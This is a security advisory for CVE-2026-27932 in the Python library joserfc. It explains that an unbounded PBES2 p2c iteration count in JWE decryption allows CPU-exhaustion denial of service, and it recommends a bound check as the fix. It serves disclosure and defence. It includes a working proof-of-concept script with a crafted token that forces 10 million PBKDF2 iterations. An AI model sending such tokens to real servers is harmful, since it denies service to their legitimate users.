# [H] joserfc's PBES2 p2c Unbounded Iteration Count enables Denial of Service (DoS)

## Summary
Severity: High
Advisory: GHSA-w5r5-m38g-f9f9
CVE: CVE-2026-27932
CWE: CWE-770
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-w5r5-m38g-f9f9
Type: github-advisory

## Affected
- PyPI: `joserfc` — affected >=0 <1.6.3

## Details
# Summary 

A resource exhaustion vulnerability in joserfc allows an unauthenticated attacker to cause a Denial of Service (DoS) via CPU exhaustion. When the library decrypts a JSON Web Encryption (JWE) token using Password-Based Encryption (PBES2) algorithms, it reads the p2c (PBES2 Count) parameter directly from the token's protected header. This parameter defines the number of iterations for the PBKDF2 key derivation function. Because joserfc does not validate or bound this value, an attacker can specify an extremely large iteration count (e.g., 2^31 - 1), forcing the server to expend massive CPU resources processing a single token.

This vulnerability exists at the JWA layer and impacts all high-level JWE and JWT decryption interfaces if PBES2 algorithms are allowed by the application's policy.

## Details
 
**Vulnerable file:** `src/joserfc/_rfc7518/jwe_algs.py`
**Vulnerable function:** `PBES2HSAlgKeyEncryption.decrypt_cek()` 
**Lines:** 283

```python
def decrypt_cek(self, recipient: Recipient[OctKey]) -> bytes:
    headers = recipient.headers()
    # ...
    p2c = headers["p2c"]  # ← attacker-controlled integer
    # ...
    kek = self.compute_derived_key(key.get_op_key("deriveKey"), p2s, p2c)
```
The `p2c` value is then passed to `compute_derived_key` : 

```python
def compute_derived_key(self, key: bytes, p2s: bytes, p2c: int) -> bytes:
    # ...
    kdf = PBKDF2HMAC(
        algorithm=self.hash_alg,
        length=self.key_size // 8,
        salt=salt,
        iterations=p2c,  # ← unbounded iterations
        backend=default_backend(),
    )
```

**Impact on JWT Policies**
Any JWT policy configured to allow PBES2 key management algorithms (e.g., `PBES2-HS256+A128KW`) is vulnerable. Because the DoS occurs during the decryption phase, the attack is triggered before any claim validation (e.g., 
exp,`iss, aud` checks) or nested signature verification takes place. This makes existing JWT "policies" ineffective as a defense if the underlying algorithm is permitted.


## PoC

**Tested against joserfc 1.6.2.
Local Reproduction:**

```python
import time
from joserfc import jwe
from joserfc.jwk import OctKey

# Force joserfc to use local source if needed
# sys.path.insert(0, "src")

# Attacker-crafted token with 10 million iterations
# Normally legitimate p2c is ~2048-4096. 10M iterations = ~5s DoS.
token = "eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwicDJzIjoiWjI5dVpYSm1ZdyIsInAyYyI6MTAwMDAwMDB9.dummy.dummy.dummy.dummy"

key = OctKey.import_key(b"any-password")

t0 = time.perf_counter()
try:
    # This call will hang the thread for seconds
    jwe.decrypt_compact(token, key, algorithms=["PBES2-HS256+A128KW", "A128CBC-HS256"])
except Exception:
    pass
print(f"Elapsed: {time.perf_counter() - t0:.2f}s")
```

## Impact
An unauthenticated remote attacker can exhaust the CPU resources of a server by sending a small number of crafted JWE/JWT tokens. Each token will occupy a worker thread/process for a duration proportional to the `p2c` value (up to several minutes or hours depending on the integer value). This results in a complete Denial of Service for legitimate users.

## Recommendation
Minimal fix: Implement an upper bound check for the `p2c` parameter in `PBES2HSAlgKeyEncryption.decrypt_cek()`.

```python
MAX_P2C = 300000  # Example security bound

# ... inside decrypt_cek ...
p2c = headers["p2c"]
if not isinstance(p2c, int) or p2c > MAX_P2C:
    raise DecodeError(f"p2c iteration count too high (max {MAX_P2C})")
```
Additionally, applications should only enable PBES2 algorithms if password-based encryption is specifically required and should enforce a strict  algorithms allowlist in their JWT/JWE policies.

## References
- https://github.com/authlib/joserfc/security/advisories/GHSA-w5r5-m38g-f9f9
- https://nvd.nist.gov/vuln/detail/CVE-2026-27932
- https://github.com/authlib/joserfc/commit/696a961
- https://github.com/authlib/joserfc/commit/696a9611ab982c45ee2190ed79ca8e1d8e09398f
- https://github.com/authlib/joserfc
